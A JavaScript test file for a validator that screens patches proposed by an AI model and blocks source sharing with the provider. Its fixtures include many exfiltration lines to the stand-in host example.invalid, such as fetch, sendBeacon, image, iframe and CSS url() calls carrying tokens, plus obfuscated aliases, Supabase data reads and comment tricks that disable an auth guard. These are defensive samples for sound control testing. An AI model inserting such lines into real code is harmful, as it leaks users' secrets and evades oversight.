import test from 'node:test';
import assert from 'node:assert/strict';
import { MODEL_ALLOWED_PATH, validateModelPatch, buildModelRequest, requestModelPatch } from '../aieo/lib/model-provider.mjs';

const source = 'function demo() {\n  const sample = 100;\n}\n';
const find = '  const sample = 100;';
const replacement = '  const sample = 101;';
const proposal = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'Correct a simple constant' });
const env = {
  AIEO_MODEL_ENABLED: 'true',
  AIEO_SOURCE_SHARING_APPROVED: 'true',
  GITHUB_EVENT_NAME: 'workflow_dispatch',
  GITHUB_REF: 'refs/heads/main',
  OPENROUTER_API_KEY: 'synthetic-key-not-real',
  OPENROUTER_MODEL_ID: 'provider/safe-model:free'
};
const task = 'Correct the sample constant in a bounded manner.';

test('scope and exact single replacement are enforced', () => {
  const result = validateModelPatch({ response: proposal, source });
  assert.equal(result.status, 'proposed');
  assert.equal(result.patchedSource, source.replace(find, replacement));
  assert.equal(validateModelPatch({ response: proposal, source: source + find }).status, 'rejected');
  assert.equal(validateModelPatch({ response: proposal, source, path: 'supabase/migrations/unsafe.sql' }).status, 'rejected');
});
test('untrusted or malformed model output fails closed', () => {
  for (const response of [
    'not JSON',
    'text: ' + proposal,
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'eval("bad")', explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'const x = process.env.SECRET;', explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'ghp_' + 'a'.repeat(30), explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: find, explanation: 'x' })
  ]) assert.equal(validateModelPatch({ response, source }).status, 'rejected');
});
test('no source disclosure without explicit consent and privacy scan', () => {
  assert.throws(() => buildModelRequest({ source, task, model: env.OPENROUTER_MODEL_ID, shareApproved: false }));
  assert.throws(() => buildModelRequest({ source: 'const api_key = "plaintext-secret";', task, model: env.OPENROUTER_MODEL_ID, shareApproved: true }));
  assert.throws(() => buildModelRequest({ source, task, model: env.OPENROUTER_MODEL_ID, shareApproved: true, path: '.env' }));
});
test('manual restrictions block all network calls on PR, missing secret, or missing consent', async () => {
  let calls = 0;
  const transport = () => { calls += 1; throw new Error('must not call'); };
  const variants = [
    { ...env, GITHUB_EVENT_NAME: 'pull_request' },
    { ...env, OPENROUTER_API_KEY: '' },
    { ...env, AIEO_SOURCE_SHARING_APPROVED: 'false' },
    { ...env, GITHUB_REF: 'refs/heads/feature' }
  ];
  for (const current of variants) assert.equal((await requestModelPatch({ source, task, env: current, transport })).status, 'blocked');
  assert.equal(calls, 0);
});
test('mock provider call sends bounded source and returns validated proposal only', async () => {
  let requests = 0;
  const transport = async (url, opts) => {
    requests += 1;
    assert.equal(url, 'https://openrouter.ai/api/v1/chat/completions');
    assert.equal(opts.method, 'POST');
    assert.equal(opts.headers.Authorization, 'Bearer synthetic-key-not-real');
    const body = JSON.parse(opts.body);
    assert.equal(body.model, env.OPENROUTER_MODEL_ID);
    assert.ok(body.messages[1].content.includes(source));
    assert.equal(JSON.stringify(body).includes(env.OPENROUTER_API_KEY), false);
    return { ok: true, text: async () => JSON.stringify({ choices: [{ message: { content: proposal } }] }) };
  };
  const result = await requestModelPatch({ source, task, env, transport });
  assert.equal(result.status, 'proposed');
  assert.equal(result.patchedSource, source.replace(find, replacement));
  assert.equal(requests, 1);
});
test('provider errors do not expose source or credentials', async () => {
  const failed = await requestModelPatch({ source, task, env, transport: async () => ({ ok: false }) });
  assert.deepEqual(failed, { status: 'failed', reason: 'Provider did not accept request' });
  const malformed = await requestModelPatch({ source, task, env, transport: async () => ({ ok: true, text: async () => 'garbage' }) });
  assert.equal(malformed.status, 'rejected');
});

test('model replacements cannot add browser side-channel transports', () => {
  for (const replacement of [
    'window.open("https://example.invalid/?data=" + token);',
    'navigator["sendBeacon"]("https://example.invalid", body);',
    'const pixel = new Image();',
    'location.assign("https://example.invalid");',
    'window.location.href = "https://example.invalid";',
    'document.createElement("iframe");',
    'globalThis["fetch"]("https://example.invalid");'
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal rejects markup and CSS side channels without fetch calls', () => {
  for (const replacement of [
    '<img src={\`https://example.invalid/?secret=\${token}\`} />',
    '<a href={unsafeUrl}>Open</a>',
    '<form action={target}>Send</form>',
    '<iframe\n src={unsafeUrl} />',
    'const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };',
    'const style = { background: \`url(https://example.invalid/\${token})\` };'
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('modern provider keys and bearer tokens are rejected before external source disclosure', async () => {
  const examples = [
    'sk-or-v1-' + 'a'.repeat(40),
    'github_pat_' + 'b'.repeat(42),
    'sk-proj-' + 'c'.repeat(42),
    'sb_secret_' + 'd'.repeat(36),
    'Bearer ' + 'e'.repeat(48)
  ];
  let sent = 0;
  const transport = async () => { sent += 1; throw new Error('source must not be sent'); };
  for (const marker of examples) {
    const unsafeSource = source + '\n// ' + marker;
    assert.throws(() => buildModelRequest({
      source: unsafeSource, task, model: env.OPENROUTER_MODEL_ID, shareApproved: true
    }));
    assert.throws(() => buildModelRequest({
      source, task: task + ' ' + marker, model: env.OPENROUTER_MODEL_ID, shareApproved: true
    }));
    assert.equal((await requestModelPatch({ source: unsafeSource, task, env, transport })).status, 'blocked');
    const unsafeProposal = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: '  const sample = "' + marker + '";',
      explanation: 'synthetic marker only'
    });
    assert.equal(validateModelPatch({ response: unsafeProposal, source }).status, 'rejected');
  }
  assert.equal(sent, 0, 'privacy rejection must happen before any HTTP attempt');
});

test('model proposal rejects block comment delimiters that could neutralize active code', () => {
  for (const replacement of [
    '  /* const sample = 101; */',
    '  const sample = 101; /* disabled auth guard */',
    '  const sample = 101; */'
  ]) {
    const attempted = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'synthetic comment bypass attempt'
    });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected');
  }
});

test('provider source sharing refuses redirects and strips referrers', async () => {
  const result = await requestModelPatch({
    source, task, env,
    transport: async (url, opts) => {
      assert.equal(url, 'https://openrouter.ai/api/v1/chat/completions');
      assert.equal(opts.redirect, 'error');
      assert.equal(opts.referrerPolicy, 'no-referrer');
      return { ok: true, redirected: true, text: async () => { throw new Error('redirect body must not be read'); } };
    }
  });
  assert.equal(result.status, 'failed');
});

test('provider reads bounded streamed responses and rejects oversized bodies without buffering them', async () => {
  const encoded = new TextEncoder();
  const response = JSON.stringify({ choices: [{ message: { content: proposal } }] });
  const streamOf = (value) => new ReadableStream({
    start(controller) {
      controller.enqueue(encoded.encode(value));
      controller.close();
    }
  });
  const good = await requestModelPatch({
    source, task, env,
    transport: async () => ({ ok: true, body: streamOf(response) })
  });
  assert.equal(good.status, 'proposed');
  assert.equal(good.patchedSource, source.replace(find, replacement));

  const tooLarge = await requestModelPatch({
    source, task, env,
    transport: async () => ({ ok: true, body: streamOf('x'.repeat(18001)) })
  });
  assert.equal(tooLarge.status, 'rejected');
  assert.equal(tooLarge.reason, 'Provider response too large');

  let readBody = false;
  const declaredOversize = await requestModelPatch({
    source, task, env,
    transport: async () => ({
      ok: true, headers: { get: () => '20000' },
      text: async () => { readBody = true; throw new Error('oversize body must not be read'); }
    })
  });
  assert.equal(declaredOversize.status, 'rejected');
  assert.equal(readBody, false);
});


test('model proposal rejects optional chaining, indirect browser APIs and aliases', () => {
  for (const replacement of [
    "fetch?.(\"https://example.invalid/?key=\" + token);",
    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
    "window?.[\"open\"]?.(\"https://example.invalid\");",
    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
    "const send = navigator.sendBeacon.bind(navigator);",
    "const forward = fetch; forward(\"https://example.invalid\");",
    "const transport = new WebTransport(\"https://example.invalid\");",
    "const stream = new EventSource(\"https://example.invalid\");",
    "const access = location?.assign;",
    "self[\"fetch\"](\"https://example.invalid\");",
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'indirect transport safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal refuses indirect HTML form, SVG, navigation and media transfers', () => {
  for (const replacement of [
    '<iframe srcDoc={untrustedMarkup} />',
    '<button formAction="https://example.invalid/collect">Send</button>',
    '<input type="image" src="https://example.invalid/pixel" />',
    '<a ping="https://example.invalid/track">Open</a>',
    '<svg><image href="https://example.invalid/pixel" /></svg>',
    '<svg><use xlink:href="https://example.invalid/asset" /></svg>',
    '<video poster="https://example.invalid/pixel" />',
    '<meta httpEquiv="refresh" content="0;url=https://example.invalid/" />',
  ]) {
    const attempted = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'outbound markup regression fixture'
    });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal refuses CSS imports and image-set network fetches', () => {
  for (const replacement of [
    'const css = `@import "https://example.invalid/style.css";`;',
    'const css = `background: image-set("https://example.invalid/pixel" 1x);`;',
  ]) {
    const attempted = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'outbound CSS regression fixture'
    });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
  const safe = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find,
    replace: '  const sample = 102;',
    explanation: 'simple static text only'
  });
  assert.equal(validateModelPatch({ response: safe, source }).status, 'proposed');
});

test('model proposal blocks long padded outbound JSX attributes and hidden spread props', () => {
  for (const replacement of [
    '<img ' + ' '.repeat(360) + 'src={unsafeUrl} />',
    '<a ' + ' '.repeat(360) + 'href={unsafeUrl}>Open</a>',
    '<img {...{ src: unsafeUrl }} />',
    '<a {...untrustedProps}>Open</a>'
  ]) {
    const response = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'negative JSX outbound regression'
    });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replacement.slice(0, 50));
  }
  const response = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find, replace: '  const sample = 103;',
    explanation: 'safe, bounded fixture'
  });
  assert.equal(validateModelPatch({ response, source }).status, 'proposed');
});

test('quoted angle brackets, arrow expressions and nested JSX cannot conceal URL sinks', () => {
  const unsafe = [
    '<img alt="one > two" src={unsafeUrl} />',
    "<a title='left > right' href={unsafeUrl}>Open</a>",
    '<img onLoad={() => 1 > 0} src={unsafeUrl} />',
    '<div content={<img src={unsafeUrl} />} />',
    '<Widget title="one > two" {...unsafeProps} />'
  ];
  for (const replace of unsafe) {
    const candidate = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'quoted angle regression' });
    assert.equal(validateModelPatch({ response: candidate, source }).status, 'rejected', replace);
  }
  const replace = '<span title="one > two">Safe label</span>';
  const candidate = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'benign angle bracket' });
  assert.equal(validateModelPatch({ response: candidate, source }).status, 'proposed');
});

test('model validator inspects complete JSX tags when replacement starts inside an existing tag', () => {
  const markup = 'const view = <img\\n  alt="safe"\\n/>;\\n'.replaceAll('\\n', '\n');
  const fragment = '  alt="safe"';
  for (const replacement of [
    '  alt="safe" src={token}',
    '  alt="safe" {...forwardedProps}'
  ]) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find: fragment, replace: replacement, explanation: 'partial tag regression' });
    assert.equal(validateModelPatch({ response, source: markup }).status, 'rejected', replacement);
  }
  const response = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find: fragment,
    replace: '  alt="updated safe"', explanation: 'ordinary label edit'
  });
  assert.equal(validateModelPatch({ response, source: markup }).status, 'proposed');
});


test('custom JSX components cannot introduce URL-bearing props', () => {
  const attemptedReplacements = [
    '<RemoteImage src={privateUrl} />',
    '<RouterLink href={privateUrl}>Follow</RouterLink>',
    '<Widget xlink:href={privateUrl} />',
    '<Card title="safe" srcSet={privateUrl} />'
  ];
  for (const replace of attemptedReplacements) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
      explanation: 'synthetic custom JSX URL regression' });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
  }
  const partialSource = 'const node = <RemoteImage alt="safe" />;\n';
  const partial = JSON.stringify({ path: MODEL_ALLOWED_PATH, find: 'alt="safe image"',
    replace: 'alt="safe image" src={privateUrl}', explanation: 'partial attr injection' });
  assert.equal(validateModelPatch({ response: partial, source: partialSource.replace('alt="safe"', 'alt="safe image"') }).status, 'rejected');
  assert.equal(validateModelPatch({ response: JSON.stringify({ path: MODEL_ALLOWED_PATH,
    find, replace: '<Display label="safe" />', explanation: 'safe custom component' }), source }).status, 'proposed');
});


test('model-generated UI edits cannot reuse the existing Supabase client', () => {
  // Existing imports and the protected submit handler stay untouched. Only
  // newly proposed text is scanned, so ordinary UI edits remain possible.
  for (const replace of [
    'const result = supabase.from("profiles").select("*");',
    'void supabase.from("feedback").insert({ message: secret });',
    'const session = supabase.auth.getSession();',
    'const client = supabase;',
    'const { from } = supabase;'
  ]) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'synthetic SDK reuse regression' });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
  }
  const benign = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find, replace: '  const sample = 105;',
    explanation: 'safe static UI content'
  });
  assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
});
